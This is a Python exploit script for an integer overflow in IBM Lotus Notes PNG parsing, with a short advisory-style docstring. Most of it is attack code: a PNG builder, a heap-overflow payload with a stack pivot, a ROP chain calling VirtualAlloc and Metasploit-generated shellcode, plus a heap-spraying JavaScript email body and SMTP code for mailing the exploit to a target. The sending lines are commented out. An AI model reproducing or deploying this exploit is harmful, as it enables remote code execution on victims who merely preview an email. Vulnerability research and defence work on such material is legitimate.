'''
IBM Lotus Notes PNG Integer Overflow

IBM Lotus Notes is the client of a collaborative client-server plataform, being IBM
Lotus Domino the application server. The email-client capability is one of its most
important and used features. IBM Lotus Notes fails to correctly parse a PNG image file
embedded in an email. Arbitrary code execution is proved possible after a malicious
email is opened or just previewed.

The faulty routine is located at nnotes+0x607B60 and looks like:

            ...
            mov     eax, [ebx+0Ch]
            push    edi
            push    eax
            push    ecx
            call    png_get_rowbytes
            mov     edx, [ebx+0Ch]
            mov     edi, eax                ;edi = width*4
            mov     eax, [ebx+8]
            push    edx
            push    eax
            mov     [ebp+var_28], edi
            call    png_get_channels
            movzx   cx, al
            mov     eax, [esi+4]            ;eax = height
            imul    eax, edi                ;eax = (width*4)*height
            add     esp, 10h
            lea     edx, [ebp+var_14]
            push    edx
            push    eax
            push    eax
            push    10000h
            mov     [esi+17h], cx
            call    OSMemAllocRaw           ;alloc (width*4)*height bytes
            ...

An integer overflow may occurs in the multiplication (width*4)*height.
In fact, the dimensions constraints are:

0 < width <= 0xF4240
0 < height <= 0x1FFFFF7E

Therefore, the allocated size within OSMemAllocRaw is almost completely controlled. That buffer will
be used to store all decompressed rows of the image. And will be filled by libpng in reverse order, i.e.
writing the last width*4 bytes and continuing upwards height times.
As we can see, with certain values of with and height we can have a heap backward overflow, in this
scenario we control:

* Overflowed buffer's size (with restrictions)
* Overflow size (with restrictions)
* Overflow data (completely)

A similar situation occurs in IBM Notes.

Juan Pablo De Francesco <jpdefrancesco@binamuse.com>
Some code from: Joshep J. Cortez Sanchez <joshep@binamuse.com>
www.binamuse.com
'''


import smtplib
import socket, pdb
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from email.Utils import COMMASPACE, formatdate
from email import encoders
import os
import sys
from subprocess import Popen, PIPE
import struct

##################### Begin miniPNG
import zlib 
import codecs
import cStringIO

class PNG:
    '''Juan Pablo De Francesco <jpdefrancesco@binamuse.com>'''
    def __init__(self, verbose=False):
        self.data = cStringIO.StringIO()
        self.data.write("\x89\x50\x4E\x47\x0D\x0A\x1A\x0A")    #PNG File Header

    def getContent(self):
        return self.data.getvalue()

    def writeIHDR(self, width, height):
        bitDepth = 8
        cType = 6
        cMethod=0
        fMethod=0
        iMethod=0
        length = struct.pack(">L", 0x0D)
        chunkType = "IHDR"
        chunkData = struct.pack(">L", width) + struct.pack(">L", height) + struct.pack(">B", bitDepth)
        chunkData += struct.pack(">B", cType) + struct.pack(">B", cMethod) + struct.pack(">B", fMethod)
        chunkData += struct.pack(">B", iMethod)
        crc = struct.pack(">L",zlib.crc32(chunkType+chunkData) & 0xFFFFFFFF)
        self.data.write(length + chunkType + chunkData + crc)

    def writeIDAT(self, width, height, data):
        chunkType = "IDAT"
        obj = zlib.compressobj()
        dataLen = (((width*4)+1)*height)
        #data = ("\x00\x01\x02\x03" + dataLen*"\x7D\x61\x60\x3D")[:(dataLen-0x4800)]
        #data =  data + "\x60\x4B\x6C\x9F"*0x1200  #0x609F6C4B
        assert dataLen == len(data)
        chunkData = obj.compress(data) + obj.flush(zlib.Z_SYNC_FLUSH) + obj.flush(zlib.Z_FINISH)
        length = struct.pack(">L", len(chunkData))
        crc = struct.pack(">L",zlib.crc32(chunkType+chunkData) & 0xFFFFFFFF)
        self.data.write(length + chunkType + chunkData + crc)

    def writeTEXT(self, keyword, text):
        chunkType = "tEXt"
        chunkData = keyword + "\x00" + text
        length = struct.pack(">L", len(chunkData))
        crc = struct.pack(">L",zlib.crc32(chunkType+chunkData) & 0xFFFFFFFF)
        self.data.write(length + chunkType + chunkData + crc)

    def writeIEND(self):
        chunkType = "IEND"
        chunkData = ""
        length = struct.pack(">L", len(chunkData))
        crc = struct.pack(">L",zlib.crc32(chunkType+chunkData) & 0xFFFFFFFF)
        self.data.write(length + chunkType + chunkData + crc)

    def writeChunk(self, chunkType, chunkData):
        length = struct.pack(">L", len(chunkData))
        crc = struct.pack(">L",zlib.crc32(chunkType+chunkData) & 0xFFFFFFFF)
        self.data.write(length + chunkType + chunkData + crc)    
        
##################### End miniPNG

def sendMail(smtp, port, user, password, to, msg ):
    socket.setdefaulttimeout(300)
    mailServer = smtplib.SMTP(smtp, port)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(user, password)
    mailServer.sendmail(user, to, msg)
    #mailServer.close()
    mailServer.quit()



def makeEml(fromAddr, to, subject, text, filenameStr, payload):
    assert type(to)==list

    msgRoot = MIMEMultipart()
    msgRoot['From'] = fromAddr
    msgRoot['To'] = COMMASPACE.join(to)
    msgRoot['Date'] = formatdate(localtime=True)
    msgRoot['Subject'] = subject
    msgRoot.attach(MIMEMultipart('related'))

    html_emb = '''<script type="text/javascript">
                    function wait(){
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAB");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAC");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAD");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAE");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAF");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAG");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAH");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAI");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAJ");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAK");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAL");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAM");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAN");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAO");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAP");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAQ");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAR");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAS");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAT");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAU");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAV");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAW");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAX");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAY");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAZ");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAB");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAC");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAD");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAE");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAF");
                        chunk.search("AAAAAAAAAAAAAAAAAAAAAAAAAAG");
                    }
                    function callGC(off)
                    {
                        var n=0;
                        for (n=0; n<0x2000-((off+1)%0x2000); n++);

                        wait();

                        //trigger GC
                        var tmp;
                        for (n=0; n<1; n++)
                            tmp = new Object();
                    }
                    if (window.document._Memo.tmpDisplayFrom_Preview != undefined){
                        var size = 100;
                        var x = new Array(size);
                        var i = 0;
                        var slide_size=0x100000;
                        var chunk = "A";
                        while (chunk.length <= slide_size/2)
                            chunk += chunk;

                        for (i=0; i < size; i+=1) {
                            x[i]= chunk.substring(4,slide_size/2-20 - + i.toString().length);
                        }

                        x[50] = new Object();
                        x[52] = new Object();
                        x[54] = new Object();
                        x[56] = new Object();

                        x[60] = new Object();
                        x[61] = new Object();
                        x[63] = new Object();
                        x[64] = new Object();
                        x[65] = new Object();
                        x[66] = new Object();
                        callGC(0x78);
                    }
                </script>'''
    html_emb += '''
                    <img name="img1" src="cid:imagen" height=1 width=1>
                '''
    html_emb += '''<script type="text/javascript">
                    if (window.document._Memo.tmpDisplayFrom_Preview === undefined)
                        window.document.images.img1.src = "";
                </script>'''


    msgImage = MIMEBase('application', 'octet-stream')
    msgImage.set_payload(payload)
    encoders.encode_base64(msgImage)    
    msgImage.add_header('Content-ID', '<imagen>')
    msgImage.add_header('Content-Disposition', 'attachment', filename=filenameStr)
    msgRoot.attach(msgImage)

    part = MIMEMultipart('alternative')
    msgHtml = MIMEText(html_emb, 'html')
    part.attach(msgHtml)
    msgRoot.attach(part)

    msgRoot.attach(MIMEText(text))
    return msgRoot.as_string()



def makePayload(payloadOpt):
    png = PNG()
    png.writeIHDR(0x806, 0x7FC00)

    data = ("\x00" + 0x806*struct.pack("<L", 0x629B7DF0))*0x37A

    msfpayload = Popen("msfpayload4.4 %s R"%payloadOpt, shell=True, stdout=PIPE)
    msfpayload = "\x90"*0x20 + msfpayload.communicate()[0]

    payload = "\xE9\xFB\x0F\x00\x00" #JMP +0x1000
    payload += msfpayload #"\x90"*0x800 + "\xEB\xFE"
    assert len(payload)<0x1000
    payload = payload + "\x90"*(0x1000-len(payload))
    exitClean = '''
                6A 00 6A 00 6A 00 04 05 50 6A 00 6A 00 FF 15 EC
                41 9B 62 83 C4 1C 5C 83 C4 08 31 C0 BF F0 7D 9B
                62 B9 00 08 00 00 F3 AB C7 05 84 91 9B 62 5A 3B
                9B 62 31 FF 31 F6 31 ED 31 DB 31 D2 81 3C E4 52
                3B 9B 62 74 02 B2 20 FF 25 84 91 9B 62'''.replace(" ", "").replace("\n", "")
    payload += exitClean.decode("hex")
    if len(payload)<4*0x4E3:
        payload = payload + "\x90"*(4*0x4E3 - len(payload))

    pivotStack = "" 
    pivotStack += struct.pack("<L", 0x629B9190) #0x4E3
    pivotStack += struct.pack("<L", 0x629B9188) #0x4E4
    pivotStack += struct.pack("<L", 0x629B3A64) #0x4E5 #start pivoting
    pivotStack += struct.pack("<L", 0x629B9190) #0x4E6
    pivotStack += struct.pack("<L", 0x629B381E) #0x4E7 #MOV EAX, [ECX] #CALL [EAX+14]
    pivotStack += struct.pack("<L", 0x62995099) #0x4E8 #POP EBP # RETN

    ROP = ""
    ROP += struct.pack("<L", 0x629B91A4) #0x4E9
    ROP += struct.pack("<L", 0x6299546A) #0x4EA #MOV [ESI+6c], EAX # POP EDI # POP ESI # POP EBX # LEAVE # RETN
    ROP += struct.pack("<L", 0x00000000) #0x4EB
    ROP += struct.pack("<L", 0x7C37A094) #0x4EC
    ROP += struct.pack("<L", 0x7C348B05) #0x4ED #XCHG EAX, ESP # RETN
    ROP += struct.pack("<L", 0x7C3734A1) #0x4EE #JMP [ESI] (VirtualAlloc)
    ROP += struct.pack("<L", 0x7C3439FA) #0x4EF #(ret VirtualAlloc) #POP EDX # RETN
    ROP += struct.pack("<L", 0x00000000) #0x4F0 #lpAddress=NULL
    ROP += struct.pack("<L", 0x00002000) #0x4F1 #dwSize=0x2000
    ROP += struct.pack("<L", 0x00003000) #0x4F2 #flAllocationType=MEM_COMMIT|MEM_RESERVE
    ROP += struct.pack("<L", 0x00000040) #0x4F3 #flProtect=EXECUTE_READWRITE
    ROP += struct.pack("<L", 0x3999D874) #0x4F4 #EDX=
    ROP += struct.pack("<L", 0x7C34E03E) #0x4F5 #POP ECX # POP ESI # RETN
    ROP += struct.pack("<L", 0x00000800) #0x4F6 #ECX=
    ROP += struct.pack("<L", 0x7C34AD9E) #0x4F7 #ESI=0x7C34AD9E -> #POP EBX # POP ESI # RETN
    ROP += struct.pack("<L", 0x629A8BAE) #0x4F8 #MOV EDI, EAX # CALL ESI
    ROP += struct.pack("<L", 0x629B7DF0) #0x4F9 #ESI=
    ROP += struct.pack("<L", 0x7C342F8C) #0x4FA #REP MOVS [EDI], [ESI] # JMP [EDX*4+7C34300C]
    ROP += struct.pack("<L", 0x7C359B1C) #0x4FB #JMP EAX

    tmp = payload + pivotStack + ROP 
    if len(tmp)<4*0x806:
        tmp = tmp + "\x00"*(4*0x806 - len(tmp))

    data += "\x00" + tmp #to overwrite pointer at 0x629B9184
    data += ("\x00" + 0x806*struct.pack("<L", 0x629B7DF0))*3
    png.writeIDAT(0x800, 0x37E, data[:(((0x800*4)+1)*0x37E)])

    return png.getContent()



if __name__=="__main__":
    import optparse
    parser = optparse.OptionParser(description='IBM Lotus Notes/IBM Notes - Heap Overflow')
    parser.add_option('--payload', metavar='PAYLOAD', default=None, help="Metasploit payload (use EXITFUNC=thread). Ex. 'windows/exec CMD=calc'")


    parser.add_option('--subject', metavar='SUBJECT', default="A subject", help="The email subject")
    parser.add_option('--content', metavar='CONTENT.TXT', default=None, help="A txt file with the email content")
    parser.add_option('--to', metavar='TO', default=None, help="A target email address to send the exploit <REQUIRED>")
    parser.add_option('--from', metavar='FROM', default=None, help="A from email address")
    parser.add_option('--smtp', metavar='SMTP', default="smtp.gmail.com", help="An smtp server")
    parser.add_option('--port', metavar='PORT', default=587, help="The smtp port")
    parser.add_option('--user', metavar='USER', default="voltron@gmail.com", help="The smtp server username")
    parser.add_option('--password', metavar='PASSWORD', default="voltron@gmail.com", help="The smtp server password")


    parser.add_option('--doc', action='store_true', default=False, help='Print detailed documentation')
    (options, args) = parser.parse_args()

    if options.doc:
        print __doc__
        exit(-1)

    payloadOpt = "windows/exec CMD=calc EXITFUNC=thread"
    if options.payload:
        payloadOpt = options.payload



    if not options.content is None:
        content = file(options.content,"rb").read()
    else:
        content = "Hi there! You are pwned!"

    if options.to is None:
        print "Target email needed (try --help)"
        exit(-1)
    if options.smtp is None:
        print "Need an SMTP server (try --help)"
        exit(-1)
    if options.user is None:
        print "Need SMTP credentials (user)"
        exit(-1)
    if options.password is None:
        print "Need SMTP credentials (password)"
        exit(-1)

    fromAddr = getattr(options,'from')
    if fromAddr is None:
        fromAddr = options.user

    msg = "Hello!"
    #If you uncomment the following two lines the exploit will be sent.
    #Be sure you are using a private smtp server so this won't get leaked to the internet

    #payload = makePayload(payloadOpt)            #msfpayload4.4 should by in the PATH
    #msg = makeEml(fromAddr, options.to, options.subject, content, "chart.png", payload)

    #This tries to use tls (untested)
    sendMail(options.smtp, options.port, options.user, options.password, options.to, msg)

    #bye

